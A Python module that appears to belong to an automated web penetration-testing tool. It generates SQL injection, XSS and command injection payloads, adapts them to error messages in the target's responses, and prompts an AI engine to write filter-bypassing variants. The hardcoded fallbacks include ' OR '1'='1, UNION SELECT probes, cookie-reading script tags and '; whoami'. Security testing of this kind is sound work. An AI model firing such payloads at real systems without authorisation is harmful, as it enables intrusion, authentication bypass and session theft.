"""
Adaptive Payload Generation Engine
Creates intelligent, response-aware payloads
"""

import json
import logging
import re
from typing import Dict, Any, List, Optional
from datetime import datetime

logger = logging.getLogger(__name__)

class AdaptivePayloadEngine:
    """Generates adaptive payloads based on response analysis"""
    
    def __init__(self, ai_engine):
        self.ai_engine = ai_engine
        self.payload_history = []
        self.response_history = []
        self.learning_data = {}
        
    def generate_payload(self, vulnerability_type: str, context: Dict[str, Any]) -> str:
        """Generate adaptive payload based on previous responses"""
        
        # Extract context
        parameter = context.get('parameter', 'input')
        previous_response = context.get('previous_response', '')
        previous_payload = context.get('previous_payload', '')
        attempt = context.get('attempt', 0)
        db_type = context.get('db_type', 'Unknown')
        
        # Analyze previous response if available
        if previous_response and previous_payload:
            analysis = self._analyze_response(previous_response, previous_payload, vulnerability_type)
            
            # Build enhanced context with analysis
            context['analysis'] = analysis
            context['vulnerability_type'] = vulnerability_type
            
            # Generate advanced payload based on analysis
            payload = self._generate_advanced_payload(context)
        else:
            # First attempt - use base payload
            payload = self._get_base_payload(vulnerability_type, parameter)
        
        # Store payload in history
        self.payload_history.append({
            'timestamp': datetime.now().isoformat(),
            'vulnerability_type': vulnerability_type,
            'parameter': parameter,
            'payload': payload,
            'attempt': attempt
        })
        
        return payload
    
    def _analyze_response(self, response: str, payload: str, vuln_type: str) -> Dict[str, Any]:
        """Analyze response to extract useful information"""
        analysis = {
            'error_patterns': [],
            'reflection_points': [],
            'suggested_techniques': []
        }
        
        response_lower = response.lower()
        
        # SQL Injection analysis
        if vuln_type == 'SQL Injection':
            if 'mysql' in response_lower:
                analysis['db_type'] = 'MySQL'
                analysis['suggested_techniques'].append('MySQL-specific UNION queries')
                analysis['suggested_techniques'].append('MySQL comment syntax: -- ')
            elif 'postgresql' in response_lower or 'postgres' in response_lower:
                analysis['db_type'] = 'PostgreSQL'
                analysis['suggested_techniques'].append('PostgreSQL-specific payloads')
            elif 'oracle' in response_lower or 'ora-' in response_lower:
                analysis['db_type'] = 'Oracle'
                analysis['suggested_techniques'].append('Oracle-specific concatenation')
            elif 'sqlite' in response_lower:
                analysis['db_type'] = 'SQLite'
                analysis['suggested_techniques'].append('SQLite-specific functions')
            
            # Extract error details
            error_match = re.search(r'(error|warning|syntax)[:;]\s*([^.\n]+)', response_lower)
            if error_match:
                analysis['error_patterns'].append(error_match.group(2))
        
        # XSS analysis
        elif vuln_type == 'XSS':
            # Check reflection context
            if '&lt;' in response or '&gt;' in response:
                analysis['context'] = 'HTML_encoded'
                analysis['suggested_techniques'].append('Use event handlers instead of script tags')
            elif 'javascript:' in response_lower:
                analysis['context'] = 'javascript_url'
                analysis['suggested_techniques'].append('Use javascript:alert(1)')
            elif '"' in response or "'" in response:
                analysis['context'] = 'attribute'
                analysis['suggested_techniques'].append('Break out of attribute with quotes')
            
            # Check for filtering
            if 'script' not in response_lower and 'script' in payload.lower():
                analysis['filtered'] = True
                analysis['suggested_techniques'].append('Use case variation: <ScRiPt>')
                analysis['suggested_techniques'].append('Use event handlers: onerror=alert(1)')
        
        # Command Injection analysis
        elif vuln_type == 'Command Injection':
            if 'uid=' in response_lower or 'gid=' in response_lower:
                analysis['os'] = 'Linux'
                analysis['command_executed'] = 'whoami'
            elif 'windows' in response_lower or 'win32' in response_lower:
                analysis['os'] = 'Windows'
                analysis['suggested_techniques'].append('Use & instead of ;')
            
            # Check for command output
            if 'root' in response_lower or 'admin' in response_lower:
                analysis['user_found'] = True
        
        return analysis
    
    def _generate_advanced_payload(self, context: Dict[str, Any]) -> str:
        """Generate advanced payload using AI with context"""
        
        vuln_type = context.get('vulnerability_type', 'SQL Injection')
        parameter = context.get('parameter', 'input')
        analysis = context.get('analysis', {})
        
        prompt = f"""
        Generate an advanced {vuln_type} payload based on this analysis:
        
        Vulnerability Type: {vuln_type}
        Target Parameter: {parameter}
        
        Analysis Results:
        - Database Type: {analysis.get('db_type', 'Unknown')}
        - Context: {analysis.get('context', 'Unknown')}
        - Filtered: {analysis.get('filtered', False)}
        - Error Patterns: {analysis.get('error_patterns', [])}
        - Suggested Techniques: {analysis.get('suggested_techniques', [])}
        
        Generate ONE advanced payload that:
        1. Bypasses common filters
        2. Uses appropriate syntax for detected environment
        3. Exploits the specific context
        4. Returns only the payload string
        
        Payload:
        """
        
        try:
            response = self.ai_engine.model_chat(prompt, max_tokens=150)
            payload = response.strip()
            
            # Clean up
            payload = payload.strip('"\'')
            if payload.startswith('```'):
                payload = payload.split('```')[1].strip()
            
            return payload
            
        except Exception as e:
            logger.error(f"Advanced payload generation error: {e}")
            return self._get_advanced_fallback_payload(vuln_type, analysis)
    
    def _get_base_payload(self, vuln_type: str, parameter: str) -> str:
        """Get base payload for first attempt"""
        base_payloads = {
            'SQL Injection': f"' OR '1'='1",
            'XSS': f"<script>alert(1)</script>",
            'Command Injection': f"; whoami",
            'IDOR': f"1",
            'Authentication': f"admin'--"
        }
        return base_payloads.get(vuln_type, "test")
    
    def _get_advanced_fallback_payload(self, vuln_type: str, analysis: Dict) -> str:
        """Get advanced fallback payload based on analysis"""
        
        if vuln_type == 'SQL Injection':
            db_type = analysis.get('db_type', '')
            if db_type == 'MySQL':
                return "' OR 1=1#"
            elif db_type == 'PostgreSQL':
                return "' OR 1=1--"
            elif db_type == 'Oracle':
                return "' OR '1'='1"
            else:
                return "' UNION SELECT NULL--"
        
        elif vuln_type == 'XSS':
            if analysis.get('context') == 'attribute':
                return '"><script>alert(1)</script>'
            elif analysis.get('filtered'):
                return '<img src=x onerror=alert(1)>'
            else:
                return '<script>alert(document.cookie)</script>'
        
        elif vuln_type == 'Command Injection':
            os_type = analysis.get('os', '')
            if os_type == 'Windows':
                return '& whoami'
            else:
                return '| whoami'
        
        return self._get_base_payload(vuln_type, 'input')
    
    def record_response(self, response: str, payload: str, vulnerable: bool):
        """Record response for learning"""
        self.response_history.append({
            'timestamp': datetime.now().isoformat(),
            'payload': payload,
            'response_preview': response[:500],
            'vulnerable': vulnerable
        })
        
        # Learn from successful payloads
        if vulnerable:
            self.learning_data[payload] = {
                'successful': True,
                'response_patterns': self._extract_patterns(response)
            }
    
    def _extract_patterns(self, response: str) -> List[str]:
        """Extract patterns from response"""
        patterns = []
        response_lower = response.lower()
        
        # Extract error messages
        error_pattern = re.compile(r'(error|warning|exception)[:\s]+([^\n.]+)', re.IGNORECASE)
        matches = error_pattern.findall(response_lower)
        for match in matches:
            patterns.append(match[1])
        
        return patterns